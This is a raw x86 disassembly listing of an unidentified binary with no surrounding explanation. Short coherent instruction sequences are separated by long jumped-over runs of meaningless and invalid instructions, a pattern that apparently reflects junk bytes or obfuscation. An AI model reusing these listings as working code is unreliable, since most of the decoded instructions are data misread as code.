  40bc64:	dec    ebp
  40bc65:	in     al,dx
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	(bad)  
  40bc96:	and    ax,0xc6e1
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	adc    edi,DWORD PTR [edx]
  40bca3:	cmp    BYTE PTR [edi-0x39],bh
  40bca6:	shr    DWORD PTR [eax+0x10],0x15
  40bcaa:	and    al,0xe8
  40bcac:	mov    ah,0x9c
  40bcae:	stc    
  40bcaf:	mov    ecx,DWORD PTR [ebx-0x10]
  40bcb2:	mov    al,0x3b
  40bcb4:	outs   dx,DWORD PTR ds:[esi]
  40bcb5:	ja     0x40bc7b
  40bcb7:	cli    
  40bcb8:	jp     0x40bcea
  40bcba:	pop    edx
  40bcbb:	test   BYTE PTR [edi+eax*1+0x401e7916],0xe3
  40bcc3:	mov    ah,0xb2
  40bcc5:	adc    DWORD PTR [ebx+0x80a2a2c],0xffffffe2
  40bccc:	ins    DWORD PTR es:[edi],dx
  40bccd:	sbb    al,bh
  40bccf:	pop    ebx
  40bcd0:	repnz sbb ebx,DWORD PTR [esi-0x224bf2ed]
  40bcd7:	std    
  40bcd8:	dec    ebp
  40bcd9:	pushf  
  40bcda:	dec    edx
  40bcdb:	lods   eax,DWORD PTR ds:[esi]
  40bcdc:	jge    0x40bcb0
  40bcde:	dec    ebx
  40bcdf:	into   
  40bce0:	xlat   BYTE PTR ds:[ebx]
  40bce1:	jno    0x40bce7
  40bce3:	lods   al,BYTE PTR ds:[esi]
  40bce4:	pop    ecx
  40bce5:	push   ecx
  40bce6:	mov    al,0x1
  40bce8:	test   al,0x83
  40bcea:	cmp    ecx,esp
  40bcec:	rcr    BYTE PTR [esi+0x6b],1
  40bcef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcf0:	push   esi
  40bcf1:	inc    edx
  40bcf2:	iret   
  40bcf3:	push   edi
  40bcf4:	xor    eax,0x190f68f2
  40bcf9:	iret   
  40bcfa:	inc    ecx
  40bcfb:	sbb    eax,0x8d2386c9
  40bd00:	loop   0x40bc9f
  40bd02:	push   ebx
  40bd03:	mov    dh,0x9a
  40bd05:	pop    ecx
  40bd06:	dec    ebp
  40bd07:	out    0x3b,eax
  40bd09:	push   edx
  40bd0a:	stos   DWORD PTR es:[edi],eax
  40bd0b:	and    dl,BYTE PTR [eax+0x65ebe09c]
  40bd11:	cld    
  40bd12:	aad    0xc8
  40bd14:	out    dx,al
  40bd15:	ret    
  40bd16:	mov    dl,0xc5
  40bd18:	ss jae 0x40bd95
  40bd1b:	add    al,0x4d
  40bd1d:	cmp    DWORD PTR [edi],esi
  40bd1f:	mov    ds:0x86bc3efc,eax
  40bd24:	sar    dl,cl
  40bd26:	pop    esi
  40bd27:	jg     0x40bcff
  40bd29:	push   0xc7a6957
  40bd2e:	mov    bh,0xbd
  40bd30:	fsub   QWORD PTR [esi+0x48]
  40bd33:	bound  edi,QWORD PTR [ebx-0x6a8c477b]
  40bd39:	fisttp WORD PTR [edi+0x62]
  40bd3c:	or     al,0x26
  40bd3e:	shr    DWORD PTR [ebx-0x19e5bb6],cl
  40bd44:	and    al,0x98
  40bd46:	std    
  40bd47:	loopne 0x40bd81
  40bd49:	or     ebp,DWORD PTR [esi+edi*4]
  40bd4c:	fadd   DWORD PTR [ebp+eiz*1+0x44]
  40bd50:	daa    
  40bd51:	sbb    ecx,ebx
  40bd53:	iret   
  40bd54:	(bad)  [ebx]
  40bd56:	gs mov al,0xfa
  40bd59:	inc    edx
  40bd5a:	test   eax,0xb7f989af
  40bd5f:	cmp    al,BYTE PTR [ebx+0x5d]
  40bd62:	fbstp  TBYTE PTR [edx]
  40bd64:	nop
  40bd65:	hlt    
  40bd66:	iret   
  40bd67:	adc    cl,bh
  40bd69:	inc    edi
  40bd6a:	add    al,0xb8
  40bd6c:	stos   BYTE PTR es:[edi],al
  40bd6d:	mov    eax,ds:0x225be69a
  40bd72:	cmc    
  40bd73:	call   0x803ecd8d
  40bd78:	shl    BYTE PTR [eax+0x6d],0x4d
  40bd7c:	outs   dx,BYTE PTR ds:[esi]
  40bd7d:	or     DWORD PTR [ecx+eiz*8],0x86489729
  40bd84:	out    dx,eax
  40bd85:	sbb    BYTE PTR [edx-0x3a],al
  40bd88:	xchg   edx,eax
  40bd89:	arpl   WORD PTR [esi-0x4819951],ax
  40bd8f:	out    dx,al
  40bd90:	popa   
  40bd91:	les    esp,FWORD PTR [eax+0x5dd95810]
  40bd97:	sub    eax,0x6c4d88f9
  40bd9c:	(bad)  
  40bd9d:	jns    0x40be0b
  40bd9f:	cwde   
  40bda0:	dec    ecx
  40bda1:	in     eax,dx
  40bda2:	test   esi,ecx
  40bda4:	leave  
  40bda5:	pop    ss
  40bda6:	sahf   
  40bda7:	test   DWORD PTR ds:0xa6be6393,edx
  40bdad:	fnstenv [esp+ecx*1+0x2c0d3ee]
  40bdb4:	neg    DWORD PTR [eax]
  40bdb6:	mov    al,0xce
  40bdb8:	add    dh,BYTE PTR [ecx+0x29]
  40bdbb:	lods   eax,DWORD PTR ds:[esi]
  40bdbc:	popf   
  40bdbd:	inc    edi
  40bdbe:	pusha  
  40bdbf:	jnp    0x40bd8d
  40bdc1:	into   
  40bdc2:	data16 ss jo 0x40bd78
  40bdc6:	dec    ebp
  40bdc7:	dec    edx
  40bdc8:	jecxz  0x40be0c
  40bdca:	dec    ecx
  40bdcb:	in     al,0x38
  40bdcd:	aam    0xc5
  40bdcf:	inc    eax
  40bdd0:	push   eax
  40bdd1:	sar    BYTE PTR [eax+0x144bba0b],1
  40bdd7:	pop    ebx
  40bdd8:	dec    edx
  40bdd9:	sub    eax,ecx
  40bddb:	and    cl,BYTE PTR [esi-0x2f021596]
  40bde1:	clc    
  40bde2:	ja     0x40be54
  40bde4:	clc    
  40bde5:	dec    ecx
  40bde6:	stc    
  40bde7:	ds ja  0x40bdc1
  40bdea:	ins    BYTE PTR es:[edi],dx
  40bdeb:	xor    al,0x32
  40bded:	mov    ch,0x4d
  40bdef:	dec    ebx
  40bdf0:	sub    ebp,DWORD PTR [eax-0x777421da]
  40bdf6:	(bad)  
  40bdf7:	ffreep st(7)
  40bdf9:	loop   0x40be44
  40bdfb:	cwde   
  40bdfc:	loop   0x40bdc4
  40bdfe:	mov    BYTE PTR [edi-0x4a],ah
  40be01:	out    0x3,al
  40be03:	or     BYTE PTR [eax+0x56],al
  40be06:	jmp    0x40be45
  40be08:	sub    ch,BYTE PTR [ecx-0x6c14c96d]
  40be0e:	in     eax,dx
  40be0f:	test   eax,eax
  40be11:	bswap  edx
  40be13:	sbb    edi,ebx
  40be15:	mov    ds:0x986de897,al
  40be1a:	xor    eax,0xc64ff45b
  40be1f:	sbb    ebp,ebx
  40be21:	jg     0x40bdfe
  40be23:	cwde   
  40be24:	dec    ecx
  40be25:	fcom   DWORD PTR [eax+0x3b05c91b]
  40be2b:	cs fs and ecx,edx
  40be2f:	mov    ecx,0x74b8af88
  40be34:	aam    0x2e
  40be36:	sahf   
  40be37:	add    al,0x49
  40be39:	add    dh,ch
  40be3b:	add    ebx,DWORD PTR [ebp+0x3a]
  40be3e:	cmp    eax,0x4b5138b2
  40be43:	imul   ebp,DWORD PTR [edi-0x79020a74],0x36
  40be4a:	(bad)  
  40be4b:	aam    0xd3
  40be4d:	jecxz  0x40be66
  40be4f:	xor    DWORD PTR [esi+0x55274e07],edi
  40be55:	jecxz  0x40be0a
  40be57:	mov    esi,0xb0a4b88d
  40be5c:	inc    ebp
  40be5d:	aas    
  40be5e:	sbb    al,0x46
  40be60:	pop    ds
  40be61:	sub    al,0xe5
  40be63:	shl    DWORD PTR [ebx-0x4999ef30],0x88
  40be6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be6b:	xchg   edx,eax
  40be6c:	push   ebx
  40be6d:	lahf   
  40be6e:	lds    ebp,FWORD PTR [edx+0x103699ca]
  40be74:	rol    BYTE PTR [ebp+0x37],0xc
  40be78:	inc    ecx
  40be79:	sbb    DWORD PTR [edi-0x119979dd],edi
  40be7f:	sub    al,0xe7
  40be81:	and    ch,0x57
  40be84:	into   
  40be85:	jae    0x40be48
  40be87:	xor    ebp,ebx
  40be89:	aas    
  40be8a:	in     eax,0x6c
  40be8c:	in     al,dx
  40be8d:	sbb    ah,0x1f
  40be90:	sbb    eax,0x53bed147
  40be95:	push   esi
  40be96:	xchg   ebx,edx
  40be98:	rcr    esi,cl
  40be9a:	adc    DWORD PTR [eax-0x50],edx
  40be9d:	dec    edi
  40be9e:	icebp  
  40be9f:	xor    BYTE PTR [esi+edx*2-0x895a5b8],bl
  40bea6:	mov    edx,DWORD PTR [esi-0x70416559]
  40beac:	sub    BYTE PTR [edx+0x5a24ff75],0x10
  40beb3:	test   al,0x7b
  40beb5:	push   ebx
  40beb6:	into   
  40beb7:	cmp    BYTE PTR [esi],dh
  40beb9:	push   ds
  40beba:	mov    ds:0xd9217009,eax
  40bebf:	push   ss
  40bec0:	ja     0x40be52
  40bec2:	and    ecx,esp
  40bec4:	sti    
  40bec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bec6:	icebp  
  40bec7:	jbe    0x40bf39
  40bec9:	ins    DWORD PTR es:[edi],dx
  40beca:	call   0x1cbded43
  40becf:	retf   
  40bed0:	icebp  
  40bed1:	adc    eax,0x3dcd859d
  40bed6:	add    edx,DWORD PTR [esp+esi*2-0x70652a51]
  40bedd:	loopne 0x40beb7
  40bedf:	stos   BYTE PTR es:[edi],al
  40bee0:	enter  0x789d,0x33
  40bee4:	or     al,0xe
  40bee6:	mov    ecx,0x51085435
  40beeb:	pop    es
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x232e1fcf]
  40bf27:	mov    DWORD PTR [eax+0x387e7ef9],eax
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf01
  40bf31:	xor    eax,0x7c04ae6c
  40bf36:	js     0x40bfa8
  40bf38:	stos   DWORD PTR es:[edi],eax
  40bf39:	hlt    
  40bf3a:	or     DWORD PTR [ebx-0x3ad3f8e1],0x41573a10
  40bf44:	add    eax,0xfc7d6bcd
  40bf49:	mov    ah,ch
  40bf4b:	in     eax,dx
  40bf4c:	scas   eax,DWORD PTR es:[edi]
  40bf4d:	mul    BYTE PTR [ebp-0x6a8799a8]
  40bf53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf54:	or     BYTE PTR [edi+0x77cded7c],al
  40bf5a:	jo     0x40bfb0
  40bf5c:	mov    DWORD PTR [esi+0x6],0x2cc810bd
  40bf63:	mov    es,edx
  40bf65:	add    DWORD PTR [ebx+0x1d78a797],ebp
  40bf6b:	xchg   ebp,eax
  40bf6c:	aad    0xc5
  40bf6e:	fcomp  QWORD PTR [eax+esi*2-0x7d]
  40bf72:	sbb    BYTE PTR [esi+0x5d],dh
  40bf75:	lds    ecx,FWORD PTR [edx-0x7af24227]
  40bf7b:	fucomp st(0)
  40bf7d:	mov    bl,0xb0
  40bf7f:	mov    ds:0xcc82710b,al
  40bf84:	icebp  
  40bf85:	jp     0x40bf6a
  40bf87:	sub    esi,DWORD PTR [ebp+0xc2f8e31]
  40bf8d:	daa    
  40bf8e:	fidiv  DWORD PTR [ebx]
  40bf90:	ss inc ecx
  40bf92:	push   esp
  40bf93:	std    
  40bf94:	inc    DWORD PTR [edi]
  40bf96:	test   BYTE PTR [ebp+0x52],al
  40bf99:	pop    esp
  40bf9a:	xor    eax,0xbcbd8861
  40bfa0:	lods   al,BYTE PTR ds:[esi]
  40bfa1:	dec    ebp
  40bfa2:	mov    al,ds:0x787a96bb
  40bfa7:	cmp    al,0x77
  40bfa9:	mov    DWORD PTR [ecx],edi
  40bfab:	fdiv   DWORD PTR [eax+eiz*2-0x604aa852]
  40bfb2:	aas    
  40bfb3:	cmp    DWORD PTR [ebx+eax*2-0x70dee16b],ebx
  40bfba:	shl    BYTE PTR ds:0xc0fb1dae,cl
  40bfc0:	xor    al,ch
  40bfc2:	mov    DWORD PTR [ecx-0x5aa9b84c],ebp
  40bfc8:	add    al,0x93
  40bfca:	pop    esp
  40bfcb:	mov    bl,0x6
  40bfcd:	sub    eax,DWORD PTR [ecx-0x57246748]
  40bfd3:	pop    DWORD PTR [ecx+edx*2-0x3a]
  40bfd7:	fwait
  40bfd8:	add    edx,edx
  40bfda:	outs   dx,BYTE PTR ds:[esi]
  40bfdb:	sub    BYTE PTR [edx],0x88
  40bfde:	jmp    0x4fab:0x2e4cb492
  40bfe5:	jecxz  0x40c055
  40bfe7:	shr    DWORD PTR [eax+0x2a],cl
  40bfea:	stc    
  40bfeb:	dec    eax
  40bfec:	mov    WORD PTR [ecx],es
  40bfee:	cwde   
  40bfef:	stc    
  40bff0:	mov    bh,0x4d
  40bff2:	sub    DWORD PTR [ebx-0x43],ebp
  40bff5:	lea    eax,[ebx+0x65]
  40bff8:	push   ebp
  40bff9:	mov    ds:0xa3fdfdd4,eax
  40bffe:	push   eax
  40bfff:	add    bh,dh
  40c001:	in     eax,0x57
  40c003:	mov    eax,0xc8c646c4
  40c008:	inc    ecx
  40c009:	xor    al,0xb4
  40c00b:	nop
  40c00c:	jno    0x40c022
  40c00e:	nop
  40c00f:	scas   al,BYTE PTR es:[edi]
  40c010:	add    BYTE PTR [esp+ebx*4+0x64d5ac54],bh
  40c017:	retf   0xe877
  40c01a:	jecxz  0x40bfe7
  40c01c:	push   esp
  40c01d:	clc    
  40c01e:	imul   eax,DWORD PTR [ecx],0xcbfdcf90
  40c024:	in     al,dx
  40c025:	xchg   edx,eax
  40c026:	cmp    DWORD PTR [edx-0x28],edx
  40c029:	xchg   BYTE PTR ds:0xba675a53,bh
  40c02f:	inc    esp
  40c030:	dec    ebx
  40c031:	std    
  40c032:	mov    al,ds:0xb8f0d433
  40c037:	sti    
  40c038:	push   edx
  40c039:	and    bh,BYTE PTR [edi+0x7c6c6a88]
  40c03f:	pop    edi
  40c040:	sbb    BYTE PTR [ebp-0x6e084197],bh
  40c046:	xchg   ebp,edx
  40c048:	outs   dx,DWORD PTR ds:[esi]
  40c049:	inc    esi
  40c04a:	xor    al,0x71
  40c04c:	call   edi
  40c04e:	sub    eax,0x95347286
  40c053:	test   al,0x5b
  40c055:	mov    ah,0x3b
  40c057:	xor    DWORD PTR [eax+0x5b4c68ca],ebp
  40c05d:	xor    dl,BYTE PTR [ebx+eax*4+0x28899b69]
  40c064:	cmp    bl,BYTE PTR [eax+0x6811c087]
  40c06a:	inc    esi
  40c06b:	in     eax,0x31
  40c06d:	cmc    
  40c06e:	dec    edx
  40c06f:	pop    esp
  40c070:	mov    eax,ss
  40c072:	jge    0x40c01c
  40c074:	ins    BYTE PTR es:[edi],dx
  40c075:	jb     0x40c03e
  40c077:	or     DWORD PTR [ebx-0x29],0x7b
  40c07b:	and    cl,BYTE PTR [eax]
  40c07d:	imul   edi,ecx,0xc42a8b2b
  40c083:	jnp    0x40c012
  40c085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c086:	cmp    DWORD PTR [edx+0x27],ecx
  40c089:	(bad)  
  40c08a:	sbb    al,0x37
  40c08c:	lods   eax,DWORD PTR ds:[esi]
  40c08d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c08e:	nop
  40c08f:	test   eax,0xca8fdec
  40c094:	adc    ebx,esi
  40c096:	ja     0x40c055
  40c098:	inc    ebp
  40c099:	ins    DWORD PTR es:[edi],dx
  40c09a:	add    al,0x2
  40c09c:	lahf   
  40c09d:	cmp    eax,0x2eb4dfaf
  40c0a2:	inc    ebp
  40c0a3:	fst    st(2)
  40c0a5:	push   edi
  40c0a6:	pop    ebp
  40c0a7:	int3   
  40c0a8:	das    
  40c0a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0aa:	jle    0x40c0f6
  40c0ac:	rol    BYTE PTR [ecx-0x66],1
  40c0af:	cli    
  40c0b0:	xor    DWORD PTR [edx+0x59],edx
  40c0b3:	mov    bh,0x4b
  40c0b5:	mov    dh,0xe4
  40c0b7:	ins    DWORD PTR es:[edi],dx
  40c0b8:	jae    0x40c119
  40c0ba:	dec    esi
  40c0bb:	mov    BYTE PTR ds:0x43e43fb5,ah
  40c0c1:	mov    esp,0xbaaa3b5f
  40c0c6:	adc    al,0x63
  40c0c8:	inc    eax
  40c0c9:	sahf   
  40c0ca:	dec    esi
  40c0cb:	ds mov ecx,0xcd877cf0
  40c0d1:	jae    0x40c0e6
  40c0d3:	lahf   
  40c0d4:	sbb    bl,BYTE PTR [ebp+0x63]
  40c0d7:	inc    ebp
  40c0d8:	pop    es
  40c0d9:	mov    ch,0x3e
  40c0db:	adc    al,0xa3
  40c0dd:	clc    
  40c0de:	test   DWORD PTR [edi+0x54],ebp
  40c0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0e2:	xchg   esp,eax
  40c0e3:	add    eax,DWORD PTR [ebp+0x1f833e81]
  40c0e9:	ins    DWORD PTR es:[edi],dx
  40c0ea:	push   ds
  40c0eb:	test   DWORD PTR [eax-0x4014f954],ebp
  40c0f1:	pop    ecx
  40c0f2:	xor    eax,0x4cb71c4d
  40c0f7:	xchg   edi,eax
  40c0f8:	mov    cl,0x4c
  40c0fa:	jg     0x40c105
  40c0fc:	or     ebx,edx
  40c0fe:	jns    0x40c083
  40c100:	push   0xffffff82
  40c102:	int    0xbc
  40c104:	int    0xd6
  40c106:	adc    ch,bl
  40c108:	push   ebp
  40c109:	xor    BYTE PTR [ecx],dh
  40c10b:	ret    
  40c10c:	mov    ds:0x877076ae,al
  40c111:	fistp  DWORD PTR [edx]
  40c113:	dec    edi
  40c114:	mov    edx,0x8604218
  40c119:	icebp  
  40c11a:	setne  BYTE PTR [ebx+eax*2]
  40c11e:	enter  0x7b4a,0x2b
  40c122:	mov    DWORD PTR [esi+0x27],esp
  40c125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c126:	push   edi
  40c127:	push   ds
  40c128:	push   es
  40c129:	cmp    edx,DWORD PTR [edi]
  40c12b:	repnz sub eax,0xcc99a93b
  40c131:	dec    edx
  40c132:	jecxz  0x40c1a0
  40c134:	outs   dx,BYTE PTR ds:[esi]
  40c135:	jmp    0x6dca:0x7fc197e3
  40c13c:	fwait
  40c13d:	aam    0x2d
  40c13f:	push   edx
  40c140:	cmp    dl,ch
  40c142:	mov    ds:0xe897e9bd,eax
  40c147:	pop    ebx
  40c148:	sub    ebp,DWORD PTR [ecx]
  40c14a:	dec    eax
  40c14b:	lea    eax,[esi]
  40c14d:	mov    edi,0xb3dd276f
  40c152:	xor    DWORD PTR [eax],edi
  40c154:	or     BYTE PTR ds:0xe2f61385,0xb0
  40c15b:	mov    DWORD PTR ds:0xb41922cc,ebx
  40c161:	pop    esi
  40c162:	mov    esi,0xffbaeb8d
  40c167:	mov    bl,0x83
  40c169:	push   esp
  40c16a:	cmc    
  40c16b:	mov    WORD PTR [edx+0x60],?
  40c16e:	sub    BYTE PTR [edx-0x7c],cl
  40c171:	sbb    ebp,DWORD PTR [ebp+0x50]
  40c174:	and    BYTE PTR [ebx],dh
  40c176:	xchg   ebx,ecx
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xa1
  40c196:	repz sbb cl,BYTE PTR [edx+0x4a]
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	add    eax,0x4058485e
  40c1a6:	lds    edx,FWORD PTR [edx+0x79c91130]
  40c1ac:	cmp    eax,0xd6926b1f
  40c1b1:	loope  0x40c189
  40c1b3:	out    0xcd,eax
  40c1b5:	into   
  40c1b6:	xchg   BYTE PTR [ecx+eax*4],bh
  40c1b9:	xor    BYTE PTR [ebp-0x3b353e1d],bh
  40c1bf:	dec    edi
  40c1c0:	inc    ecx
  40c1c1:	mov    al,0x84
  40c1c3:	cli    
  40c1c4:	xor    edi,ebx
  40c1c6:	sahf   
  40c1c7:	(bad)  
  40c1c8:	xchg   DWORD PTR [ecx+ecx*2],edx
  40c1cb:	sub    BYTE PTR [eax-0x45ad13bf],bh
  40c1d1:	cld    
  40c1d2:	fwait
  40c1d3:	mov    ecx,0xeb2943b2
  40c1d8:	hlt    
  40c1d9:	bound  esp,QWORD PTR [esi+0x16498539]
  40c1df:	outs   dx,BYTE PTR ds:[esi]
  40c1e0:	rol    BYTE PTR [eax+0x6f],cl
  40c1e3:	inc    edx
  40c1e4:	fldcw  WORD PTR [ecx]
  40c1e6:	mov    eax,ds:0xe9c1a3a2
  40c1eb:	mov    cs,WORD PTR [edx+edi*2]
  40c1ee:	aaa    
  40c1ef:	push   ds
  40c1f0:	pop    esp
  40c1f1:	call   0x1827b268
  40c1f6:	(bad)  
  40c1f7:	push   ss
  40c1f8:	dec    esi
  40c1f9:	cld    
  40c1fa:	xor    edx,esi
  40c1fc:	adc    esi,eax
  40c1fe:	xor    al,0x78
  40c200:	pop    esi
  40c201:	jne    0x40c25b
  40c203:	xor    ecx,DWORD PTR [ebx+0x30629fe4]
  40c209:	xlat   BYTE PTR ds:[ebx]
  40c20a:	pop    ss
  40c20b:	mov    ds:0x88f5e1e6,eax
  40c210:	and    eax,0x7a6850a0
  40c215:	mov    ds:0xd308e2f0,eax
  40c21a:	cmp    al,0x11
  40c21c:	fistp  DWORD PTR [edx+0x75526e6]
  40c222:	data16 fsubr DWORD PTR [esi+0x299eeec1]
  40c229:	imul   edx,esi,0xffffffd1
  40c22c:	adc    DWORD PTR [eax+0x5f],ecx
  40c22f:	out    0x74,eax
  40c231:	push   ebx
  40c232:	(bad)  
  40c233:	mov    dh,0x20
  40c235:	dec    ebx
  40c236:	xchg   ecx,eax
  40c237:	shl    BYTE PTR [esi+0x60],1
  40c23a:	push   0x9cfb4c8a
  40c23f:	lods   al,BYTE PTR ds:[esi]
  40c240:	adc    ecx,ecx
  40c242:	add    ebx,edx
  40c244:	mov    cs,ebx
  40c246:	jmp    0x40c2c1
  40c248:	pusha  
  40c249:	cld    
  40c24a:	xor    al,0x62
  40c24c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c24d:	sub    BYTE PTR [ecx+eiz*8-0x7b],dh
  40c251:	push   0x4c
  40c253:	mov    ah,0x89
  40c255:	mov    es,WORD PTR [edi-0xfb0c903]
  40c25b:	push   ss
  40c25c:	fist   DWORD PTR [ecx]
  40c25e:	shl    BYTE PTR [ebp-0x74e84ebe],cl
  40c264:	mov    eax,0x58e583fc
  40c269:	push   edx
  40c26a:	mov    al,0x31
  40c26c:	inc    ebx
  40c26d:	add    BYTE PTR [ebp+0x350905b9],bl
  40c273:	and    DWORD PTR [ebx-0x4f5168ea],0xffffffc5
  40c27a:	xchg   BYTE PTR [edi-0x4b0cbce1],ch
  40c280:	sub    cl,BYTE PTR [edx+0x6c]
  40c283:	sub    al,0x48
  40c285:	bound  eax,QWORD PTR [ebp+0x1cf592b0]
  40c28b:	and    BYTE PTR [edi+edi*1+0x244b889d],ah
  40c292:	int    0x94
  40c294:	aaa    
  40c295:	sbb    eax,0x4fa8c66b
  40c29a:	int3   
  40c29b:	adc    al,0x77
  40c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c29e:	adc    eax,0x9d730bcb
  40c2a3:	dec    ebx
  40c2a4:	xor    DWORD PTR [edx],ebp
  40c2a6:	xlat   BYTE PTR ds:[ebx]
  40c2a7:	sbb    ah,BYTE PTR [edi-0x4c]
  40c2aa:	(bad)  
  40c2ab:	pusha  
  40c2ac:	clc    
  40c2ad:	push   0xcdf7a9de
  40c2b2:	sub    ebx,DWORD PTR [ebx+0x7fbe7cb1]
  40c2b8:	or     edi,ebp
  40c2ba:	mov    ebp,0x501aa6a9
  40c2bf:	dec    esi
  40c2c0:	mov    ebx,0xae03fbd6
  40c2c5:	add    DWORD PTR [edi-0x5bb8c221],ebx
  40c2cb:	xchg   BYTE PTR [esi-0x3123a84],cl
  40c2d1:	mov    edi,0x1e532036
  40c2d6:	push   ecx
  40c2d7:	mov    cl,0x5a
  40c2d9:	or     edx,DWORD PTR [edx]
  40c2db:	aaa    
  40c2dc:	(bad)  
  40c2dd:	cmp    ebp,esp
  40c2df:	add    eax,0x3d8a6358
  40c2e4:	addr16 mov edx,0xbfd67d9
  40c2ea:	outs   dx,BYTE PTR gs:[esi]
  40c2ec:	dec    esi
  40c2ed:	add    esp,DWORD PTR [esi+eiz*4+0xc69513a]
  40c2f4:	cmp    esp,esp
  40c2f6:	mov    dl,BYTE PTR [ebx]
  40c2f8:	add    edi,eax
  40c2fa:	gs ret 0x8ce9
  40c2fe:	add    eax,0xc0bbafc9
  40c303:	pop    esi
  40c304:	inc    esp
  40c305:	inc    esp
  40c306:	push   es
  40c307:	dec    esi
  40c308:	inc    ecx
  40c309:	mov    WORD PTR [esi+ecx*8+0x35d221bc],gs
  40c310:	mov    ds:0x9af05a37,eax
  40c315:	inc    esp
  40c316:	push   esi
  40c317:	mul    BYTE PTR [edx]
  40c319:	icebp  
  40c31a:	lds    esp,FWORD PTR [esi-0xff3c49e]
  40c320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c321:	push   ss
  40c322:	xchg   edi,eax
  40c323:	or     BYTE PTR [ecx-0x78d5ac41],bh
  40c329:	lock inc ebp
  40c32b:	adc    eax,0xec7d9b33
  40c330:	rol    DWORD PTR [ecx-0x7fb71bc],0xc2
  40c337:	adc    eax,0x9767f42f
  40c33c:	push   DWORD PTR [esi]
  40c33e:	xchg   edi,eax
  40c33f:	je     0x40c346
  40c341:	lds    ecx,FWORD PTR [ebx+0x2102c0a4]
  40c347:	in     al,dx
  40c348:	int3   
  40c349:	mov    ebp,?
  40c34b:	jne    0x40c302
  40c34d:	daa    
  40c34e:	or     edi,DWORD PTR [esi-0x517cf669]
  40c354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c355:	outs   dx,DWORD PTR ds:[esi]
  40c356:	in     eax,0xd1
  40c358:	pop    ecx
  40c359:	inc    eax
  40c35a:	cdq    
  40c35b:	push   edi
  40c35c:	pop    ebp
  40c35d:	bound  ecx,QWORD PTR [edx]
  40c35f:	loop   0x40c2f9
  40c361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c362:	leave  
  40c363:	inc    ebp
  40c364:	mov    bl,0x5c
  40c366:	sbb    dl,BYTE PTR [edi+0x45d8ba9b]
  40c36c:	add    DWORD PTR [ecx],esp
  40c36e:	xchg   ebp,eax
  40c36f:	leave  
  40c370:	mov    al,ds:0xc9c97924
  40c375:	imul   esp,esi,0xbf95d22d
  40c37b:	fcom   DWORD PTR [eax+0x17a6df9c]
  40c381:	add    esi,esp
  40c383:	lahf   
  40c384:	ss dec ebp
  40c386:	pop    ebx
  40c387:	test   al,0xbb
  40c389:	mov    ch,0x3f
  40c38b:	inc    DWORD PTR [ebp-0x6]
  40c38e:	pop    ds
  40c38f:	push   edx
  40c390:	(bad)  
  40c391:	cwde   
  40c392:	in     eax,dx
  40c393:	and    eax,0xfb576739
  40c398:	pop    ss
  40c399:	jmp    0xd325:0xca51cb5f
  40c3a0:	aas    
  40c3a1:	sub    DWORD PTR [edi+0x6da57340],esp
  40c3a7:	push   ebx
  40c3a8:	jnp    0x40c388
  40c3aa:	imul   ebp,ebx,0x6489b060
  40c3b0:	out    0x32,al
  40c3b2:	inc    edi
  40c3b3:	test   DWORD PTR [edi-0x5d],ebx
  40c3b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3b7:	push   esi
  40c3b8:	inc    ecx
  40c3b9:	scas   eax,DWORD PTR es:[edi]
  40c3ba:	add    DWORD PTR [ecx],eax
  40c3bc:	jl     0x40c35d
